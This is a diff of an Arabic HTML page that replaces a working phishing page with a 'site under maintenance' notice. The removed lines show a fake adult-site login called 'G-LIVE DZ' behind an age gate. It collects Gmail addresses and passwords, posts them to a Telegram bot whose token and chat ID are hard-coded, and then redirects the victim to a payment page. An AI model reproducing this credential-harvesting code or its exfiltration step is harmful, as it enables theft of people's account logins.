@@ -1,183 +1,45 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>dz - G-LIVE DZ</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>الموقع تحت الصيانة</title>
   <style>
-    * {
-      box-sizing: border-box;
-      direction: rtl;
-    }
-    body, html {
+    body {
       margin: 0;
       padding: 0;
-      height: 100%;
-      font-family: 'Arial', sans-serif;
-      overflow: hidden;
-    }
-    video#bgVideo {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: white;
+      font-family: 'Cairo', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
       height: 100vh;
-      object-fit: cover;
-      z-index: -1;
+      text-align: center;
     }
     .container {
-      height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .login-box {
-      background: transparent;
-      border: 1.5px solid rgba(255, 255, 255, 0.5);
-      padding: 30px 25px;
+      padding: 20px;
+      background: rgba(255, 255, 255, 0.05);
       border-radius: 15px;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: none;
-      color: white;
-      display: none;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
     }
-    .login-box h2 {
-      margin-bottom: 20px;
-      text-align: center;
-      font-size: 24px;
-    }
-    .login-box input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      outline: none;
-      font-size: 16px;
-      background: rgba(0,0,0,0.4);
-      color: white;
-    }
-    .login-box button {
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      background: #00c3ff;
-      color: white;
-      font-size: 18px;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-    .login-box button:hover {
-      background: #009ac7;
-    }
-    .age-confirm {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0,0,0,0.9);
-      color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      z-index: 999;
-      padding: 30px;
-    }
-    .age-confirm h1 {
-      font-size: 26px;
+    h1 {
+      font-size: 2.5em;
       margin-bottom: 15px;
     }
-    .age-confirm p {
-      font-size: 18px;
-      margin-bottom: 25px;
+    p {
+      font-size: 1.2em;
     }
-    .age-confirm button {
-      padding: 12px 30px;
-      font-size: 18px;
-      border: none;
-      border-radius: 8px;
-      background-color: #ff0033;
-      color: white;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-    .age-confirm button:hover {
-      background-color: #cc0028;
+    @media (max-width: 600px) {
+      h1 { font-size: 1.8em; }
+      p { font-size: 1em; }
     }
   </style>
 </head>
 <body>
-
-  <!-- خلفية الفيديو -->
-  <video autoplay muted loop id="bgVideo">
-    <source src="background.mp4" type="video/mp4" />
-    متصفحك لا يدعم تشغيل الفيديو.
-  </video>
-
-  <!-- تأكيد العمر -->
-  <div class="age-confirm" id="ageConfirm">
-    <h1>تحذير +18</h1>
-    <p>هذا الموقع يحتوي على مواد إباحية. بالضغط على "تأكيد" أنت تقر بأن عمرك فوق 18 سنة.</p>
-    <button onclick="confirmAge()">تأكيد</button>
-  </div>
-
-  <!-- نموذج تسجيل الدخول -->
   <div class="container">
-    <div class="login-box" id="loginBox">
-      <h2>G-LIVE DZ</h2>
-      <input type="email" id="email" placeholder="الإيميل" required />
-      <p style="font-size: 14px; color: black; margin-top: -5px; margin-bottom: 10px;">
-        ♡ تأكد من أنك تستطيع الوصول لهذا الإيميل، ستصلك معلومات حسابك في هذا الإيميل.
-      </p>
-      <input type="password" id="password" placeholder="كلمة السر" required />
-      <button onclick="sendToTelegram()">دخول</button>
-    </div>
+    <h1>الموقع تحت الصيانة</h1>
+    <p>نقوم حاليًا بإجراء بعض التحسينات. شكرًا لصبركم، يرجى العودة لاحقًا.</p>
   </div>
-
-  <!-- سكربت -->
-  <script>
-    function confirmAge() {
-      document.getElementById("ageConfirm").style.display = "none";
-      document.getElementById("loginBox").style.display = "block";
-    }
-
-    async function sendToTelegram() {
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value.trim();
-
-      if (!email || !password) {
-        alert("يرجى إدخال الإيميل وكلمة السر.");
-        return;
-      }
-
-      const emailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
-      if (!emailRegex.test(email)) {
-        alert("يرجى إدخال بريد إلكتروني صحيح من نوع Gmail فقط مثل: example@gmail.com");
-        return;
-      }
-
-      const message = `🔐 G-LIVE DZ جديد:\n📧 الإيميل: ${email}\n🔑 كلمة السر: ${password}`;
-      const botToken = '7742615412:AAHj2GkWsq3X3_JnhkDXF0Ke-PhIjJJTFnI';
-      const chatId = '7739393558';
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-      try {
-        await fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: message }),
-        });
-        window.location.href = "payment.html";
-      } catch (err) {
-        alert("❌ حدث خطأ أثناء الإرسال.");
-      }
-    }
-  </script>
-
 </body>
 </html>
